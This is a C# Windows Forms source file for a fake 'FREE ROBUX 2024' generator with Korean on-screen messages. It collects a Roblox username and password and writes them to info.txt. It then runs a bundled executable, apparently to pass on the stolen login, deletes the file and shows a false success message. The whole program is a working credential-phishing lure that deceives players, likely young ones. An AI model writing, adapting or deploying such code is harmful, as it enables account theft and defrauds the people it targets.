using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
namespace Demo
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {

        string while_ = "not_working";
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (textBox1.Text ==  "100000")
            {
                MessageBox.Show("로벅스는 최대 100000개 이하로 입력 가능합니다.", "FREE ROBUX 2024",MessageBoxButtons.OK,MessageBoxIcon.Error);
            }
            else if (textBox1.Text == "")
            {
                MessageBox.Show("로벅스를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (textBox2.Text == "")
            {
                MessageBox.Show("비밀번호를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }
            else if (textBox3.Text == "")
            {
                MessageBox.Show("아이디를 적어주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                if (while_ == "not_working")
                {
                    MessageBox.Show("로벅스 얻기 프로그램을 시작합니다", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Information);

                    using (StreamWriter w = new StreamWriter("info.txt"))
                    {
                        w.WriteLine($"{textBox3.Text}:{textBox2.Text}:{textBox1.Text}");
                    }
                    while_ = "working";
                    try
                    {
                        ProcessStartInfo process = new ProcessStartInfo(); 

                        process.FileName = @".\assests\Demo_2.exe";

                        Process pr =  Process.Start(process);

                        pr.EnableRaisingEvents = true;

                        pr.Exited += (s, EventArgs) =>
                        {
                            File.Delete("info.txt");
                            MessageBox.Show($"{textBox3.Text}님 계정의 로벅스가 성공적으로 추가 되었습니다!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                            while_ = "not_working";
                        };
                    } catch
                    {
                        MessageBox.Show("Demo_2.exe 라는 파일이 존재 하지 않습니다!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        while_ = "not_working";
                    }

                    
                }
                else if (while_ == "working")
                {
                    MessageBox.Show("작동중 입니다. 끝날때 까지 기다려 주세요!", "FREE ROBUX 2024", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void Pr_Exited(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }
    }
}
